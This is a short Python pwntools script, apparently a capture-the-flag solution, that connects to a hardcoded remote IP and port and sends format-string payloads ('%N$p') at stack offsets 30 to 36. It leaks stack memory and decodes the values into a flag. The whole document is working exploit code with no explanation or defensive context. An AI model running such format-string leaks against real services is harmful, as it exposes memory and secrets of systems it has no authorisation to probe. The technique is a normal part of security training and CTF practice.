from pwn import *
import struct

HOST = '45.33.118.86'
PORT = 9992

# Offset range yang tadi digunakan berhasil: 30–36
leak_offsets = range(30, 37)

def leak_value(offset):
    conn = remote(HOST, PORT)
    conn.recvuntil(b"Enter your input: ")
    payload = f"%{offset}$p".encode()
    conn.sendline(payload)
    response = conn.recvall(timeout=2)
    conn.close()

    # Ambil hasil leak
    lines = response.split(b"\n")
    for line in lines:
        if line.startswith(b"0x"):
            return int(line.strip(), 16)
    return None

def main():
    print("[*] Leaking stack values...")
    values = []
    for i in leak_offsets:
        print(f"[*] Trying offset {i}...")
        val = leak_value(i)
        if val is None:
            print(f"[-] Offset {i}: no valid leak")
            values.append(0)
        else:
            print(f"[+] Offset {i} = {hex(val)}")
            values.append(val)

    # Gabungkan hasil leak ke flag (little-endian unpack)
    flag_bytes = b''.join(struct.pack("<I", v) for v in values)
    try:
        flag = flag_bytes.decode('utf-8')
        print("\n🎉 FLAG FOUND:", flag)
    except UnicodeDecodeError:
        print("\n[!] Partial output (non-printable bytes):", flag_bytes)

if __name__ == "__main__":
    main()
